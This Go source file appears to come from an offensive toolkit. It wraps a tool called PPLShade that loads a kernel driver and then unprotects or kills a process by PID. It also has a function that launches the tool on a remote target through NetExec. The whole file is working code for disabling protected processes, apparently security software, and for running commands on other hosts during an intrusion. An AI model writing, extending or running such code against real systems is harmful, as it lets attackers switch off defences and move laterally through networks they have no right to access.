package tools

import (
	"adpack/utils"
	"context"
	"fmt"
)

type pplShadeTool struct{}

var PPLShade = pplShadeTool{}

func (pplShadeTool) Name() string { return "PPLShade" }
func (pplShadeTool) Available() bool {
	return utils.ToolAvailable("PPLShade.exe") || utils.ToolAvailable("PPLShade")
}

type PPLShadeMode string

const (
	PPLShadeModeLoad      PPLShadeMode = "load"
	PPLShadeModeUnprotect PPLShadeMode = "unprotect"
	PPLShadeModeKill      PPLShadeMode = "kill"
	PPLShadeModeUnload    PPLShadeMode = "unload"
	PPLShadeModeList      PPLShadeMode = "list"
)

type PPLShadeConfig struct {
	Binary string
	Driver string
	PID    int
	Mode   PPLShadeMode
}

func DefaultPPLShadeConfig() PPLShadeConfig {
	return PPLShadeConfig{
		Binary: "PPLShade.exe",
		Driver: "LECOMAx64.sys",
	}
}

func (pplShadeTool) Run(ctx context.Context, req ExecutionRequest) (*ExecutionResult, error) {
	cfg := DefaultPPLShadeConfig()
	if len(req.Args) > 0 {
		cfg.Mode = PPLShadeMode(req.Args[0])
	}
	if len(req.Args) > 1 {
		cfg.Driver = req.Args[1]
	}
	if len(req.Args) > 2 {
		fmt.Sscanf(req.Args[2], "%d", &cfg.PID)
	}

	args := []string{string(cfg.Mode)}
	switch cfg.Mode {
	case PPLShadeModeLoad:
		args = append(args, cfg.Driver)
	case PPLShadeModeUnprotect, PPLShadeModeKill:
		args = append(args, fmt.Sprintf("%d", cfg.PID))
	}

	r := utils.RunCommandCtx(ctx, cfg.Binary, args)
	if !r.Success {
		return cmdResultToExecResult(r), &ToolError{Tool: "PPLShade", Op: "run", ExitCode: r.ExitCode, Err: fmt.Errorf("%s", r.Stderr)}
	}
	return cmdResultToExecResult(r), nil
}

func (pplShadeTool) ExecRemote(ctx context.Context, target NetExecTarget, remotePath string, mode PPLShadeMode, arg string) (*ExecutionResult, error) {
	cmd := remotePath + " " + string(mode)
	if arg != "" {
		cmd += " " + arg
	}
	cr, err := NetExec.Run(ctx, target, "-x", []string{fmt.Sprintf(`start /B %s`, cmd)})
	if err != nil {
		exitCode := -1
		if cr.ExitCode != 0 {
			exitCode = cr.ExitCode
		}
		return cmdResultToExecResult(cr), &ToolError{Tool: "PPLShade", Op: "exec_remote", Err: err, ExitCode: exitCode}
	}
	if cr.ExitCode != 0 {
		return cmdResultToExecResult(cr), &ToolError{Tool: "PPLShade", Op: "exec_remote", Err: fmt.Errorf("exit code %d", cr.ExitCode), ExitCode: cr.ExitCode}
	}
	return cmdResultToExecResult(cr), nil
}
